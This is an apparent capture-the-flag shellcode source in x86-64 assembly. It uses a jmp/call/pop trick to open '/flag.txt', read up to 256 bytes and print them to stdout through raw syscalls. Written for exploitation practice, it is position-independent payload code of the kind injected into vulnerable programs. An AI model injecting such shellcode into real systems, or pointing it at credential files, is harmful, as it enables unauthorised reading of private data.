bits 64

; Open the file
jmp filename

top:
  pop rdi
  xor rsi, rsi             ; Flags = 0 (O_RDONLY)
  xor rdx, rdx             ; Mode = 0
  mov rax, 2               ; Syscall for open
  syscall

  mov rdi, rax

  ; Read from the file
  sub rsp, 0x100           ; Allocate space on the stack for the buffer
  lea rsi, [rsp]           ; Load the buffer address into rsi
  mov rdx, 0x100           ; Read up to 256 bytes
  mov rax, 0               ; Syscall for read
  syscall

  ; Write to stdout
  mov rdi, 1               ; Set fd to stdout
  mov rdx, rax             ; Set the number of bytes to write
  mov rax, 1               ; Syscall for write
  syscall

  ; Exit
  xor rdi, rdi             ; Exit code 0
  mov rax, 60              ; Syscall for exit
  syscall

filename:
  call top
  db "/flag.txt", 0        ; Null-terminated filename
